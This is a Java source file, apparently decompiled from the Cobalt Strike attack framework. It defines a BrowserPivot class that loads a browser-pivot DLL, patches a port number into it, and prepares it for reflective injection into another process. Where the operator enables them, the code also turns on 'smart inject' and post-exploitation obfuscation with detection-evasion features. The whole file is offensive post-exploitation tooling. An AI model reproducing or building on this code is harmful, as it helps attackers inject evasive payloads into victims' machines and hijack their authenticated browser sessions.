package beacon.setup;

import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import common.ReflectiveDLL;
import common.SleevedResource;
import pe.PostExObfuscator;

public class BrowserPivot {
    protected TaskBeacon tasker;

    protected int port;

    protected boolean x64;

    public BrowserPivot(TaskBeacon taskBeacon, int n, boolean bl) {
        this.tasker = taskBeacon;
        this.port = n;
        this.x64 = bl;
    }

    public boolean isX64() {
        return this.x64;
    }

    public byte[] export() {
        byte[] arrby = export_dll();
        if (this.x64) {
            arrby = ReflectiveDLL.patchDOSHeaderX64(arrby);
        } else {
            arrby = ReflectiveDLL.patchDOSHeader(arrby);
        }
        if (this.tasker.useSmartInject())
            arrby = PostExObfuscator.setupSmartInject(arrby);
        if (this.tasker.obfuscatePostEx()) {
            PostExObfuscator postExObfuscator = new PostExObfuscator();
            postExObfuscator.process(arrby);
            postExObfuscator.enableEvasions();
            arrby = postExObfuscator.getImage();
        }
        return arrby;
    }

    protected byte[] export_dll() {
        byte[] arrby = SleevedResource.readResource(this.x64 ? "resources/browserpivot.x64.dll" : "resources/browserpivot.dll");
        String str = CommonUtils.bString(arrby);
        Packer packer = new Packer();
        packer.little();
        packer.addShort(this.port);
        int i = str.indexOf("COBALTSTRIKE");
        str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), i);
        return CommonUtils.toBytes(str);
    }
}
